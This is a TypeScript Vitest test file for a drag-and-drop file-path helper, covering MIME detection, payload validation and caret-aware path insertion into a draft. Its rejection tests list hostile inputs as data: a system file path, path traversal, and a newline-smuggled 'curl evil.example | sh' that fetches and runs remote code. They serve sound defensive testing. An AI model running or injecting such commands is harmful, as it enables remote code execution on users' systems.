/**
 * Drag-to-composer pure helper tests: MIME detection and the draft splicing
 * rule (separator spacing around the caret, empty path, out-of-range caret).
 */
import { describe, expect, it } from 'vitest'
import { FILE_DRAG_MIME, hasFileDrag, insertPathIntoDraft, isValidFileDragPayload } from '../src/client/drag/file-drag.ts'

describe('hasFileDrag', () => {
  it('detects the custom file MIME among drag types', () => {
    expect(hasFileDrag([FILE_DRAG_MIME])).toBe(true)
    expect(hasFileDrag(['text/plain', FILE_DRAG_MIME, 'text/uri-list'])).toBe(true)
    expect(hasFileDrag(['Files'])).toBe(false)
    expect(hasFileDrag(['text/plain'])).toBe(false)
    expect(hasFileDrag(undefined)).toBe(false)
    expect(hasFileDrag([])).toBe(false)
  })
})

describe('isValidFileDragPayload', () => {
  it('accepts ordinary workspace-relative paths', () => {
    expect(isValidFileDragPayload('src/index.ts')).toBe(true)
    expect(isValidFileDragPayload('a b/c.ts')).toBe(true)
    expect(isValidFileDragPayload('deep/nested/dir/file.md')).toBe(true)
  })

  it('rejects forged or dangerous payloads', () => {
    expect(isValidFileDragPayload('')).toBe(false)
    expect(isValidFileDragPayload('/etc/passwd')).toBe(false)
    expect(isValidFileDragPayload('../secret')).toBe(false)
    expect(isValidFileDragPayload('a/../../secret')).toBe(false)
    expect(isValidFileDragPayload('win\\path')).toBe(false)
    expect(isValidFileDragPayload('line1\ncurl evil.example | sh')).toBe(false)
    expect(isValidFileDragPayload('x'.repeat(513))).toBe(false)
  })
})

describe('insertPathIntoDraft', () => {
  it('inserts into an empty draft', () => {
    expect(insertPathIntoDraft('', 'deploy/base/deployment.yaml')).toBe('deploy/base/deployment.yaml')
  })

  it('appends to the end by default', () => {
    expect(insertPathIntoDraft('check this', 'src/main.ts')).toBe('check this src/main.ts')
  })

  it('keeps an existing trailing space when appending', () => {
    expect(insertPathIntoDraft('check this ', 'src/main.ts')).toBe('check this src/main.ts')
  })

  it('inserts at a caret in the middle with both separators', () => {
    expect(insertPathIntoDraft('ab', 'x', 1)).toBe('a x b')
  })

  it('does not add a leading space at line start', () => {
    expect(insertPathIntoDraft('ab', 'x', 0)).toBe('x ab')
  })

  it('does not add a trailing space at the end', () => {
    expect(insertPathIntoDraft('ab', 'x', 2)).toBe('ab x')
  })

  it('inserts right after whitespace without a double space', () => {
    expect(insertPathIntoDraft('a  b', 'x', 3)).toBe('a  x b')
  })

  it('inserts right before whitespace without a double space', () => {
    expect(insertPathIntoDraft('a b ', 'x', 2)).toBe('a x b ')
  })

  it('keeps paths with spaces intact', () => {
    expect(insertPathIntoDraft('read', 'docs/My File.md')).toBe('read docs/My File.md')
  })

  it('is a no-op for an empty path', () => {
    expect(insertPathIntoDraft('abc', '')).toBe('abc')
    expect(insertPathIntoDraft('abc', '', 1)).toBe('abc')
  })

  it('clamps out-of-range carets', () => {
    expect(insertPathIntoDraft('ab', 'x', -5)).toBe('x ab')
    expect(insertPathIntoDraft('ab', 'x', 99)).toBe('ab x')
  })
})
